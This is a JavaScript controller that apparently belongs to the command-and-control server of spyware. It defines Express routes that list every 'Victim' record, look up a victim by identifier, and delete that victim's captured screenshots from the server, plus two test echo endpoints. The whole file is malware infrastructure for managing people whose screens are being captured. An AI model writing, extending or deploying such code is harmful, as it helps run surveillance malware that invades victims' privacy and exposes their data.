const Victim = require("../models/Victim");

const fs = require("fs");
const path = require("path");

class InfoController {
    async getAll(req, res) {
        try {
            const users = await Victim.find();

            res.status(200).json({ users });
        }
        catch(error) {
            console.log(`[ERROR] ${error}`);
            res.status(500).json({ message: "SERVER_ERROR" });
        }
    }

    async status(req, res) {
        try {
            res.status(200).json({ message: "OK", valid: true });
        }
        catch(error) {
            console.log(`[ERROR] ${error}`);
            res.status(500).json({ message: "SERVER_ERROR" });
        }
    }

    async clearScreenshots(req, res) {
        try {
            const { identificator } = req.body;

            const user = await Victim.findOne({ identificator });

            if (!user) return res.status(400).json({ message: "USER_NOT_FOUND" });

            user.screenshots.forEach(file => {
                fs.unlinkSync(path.join(__dirname, "../../static/", file));
            });

            user.screenshots = [];
            user.save();

            res.status(200).json({ message: "OK" });
        }
        catch(error) {
            console.log(`[ERROR] ${error}`);
            res.status(500).json({ message: "SERVER_ERROR" });
        }
    }

    async getById(req, res) {
        try {
            const { identificator } = req.params;

            const user = await Victim.findOne({ identificator });

            if (!user) return res.status(400).json({ message: "USER_NOT_FOUND" });

            res.status(200).json({ user });
        }
        catch(error) {
            console.log(`[ERROR] ${error}`);
            res.status(500).json({ message: "SERVER_ERROR" });
        }
    }

    async testGET(req, res) {
        try {
            res.status(200).json({ query: req.query });
        }
        catch(error) {
            console.log(`[ERROR] ${error}`);
            res.status(500).json({ message: "SERVER_ERROR" });
        }
    }
    async testPOST(req, res) {
        try {
            res.status(200).json({ body: req.body });
        }
        catch(error) {
            console.log(`[ERROR] ${error}`);
            res.status(500).json({ message: "SERVER_ERROR" });
        }
    }
}

module.exports = new InfoController();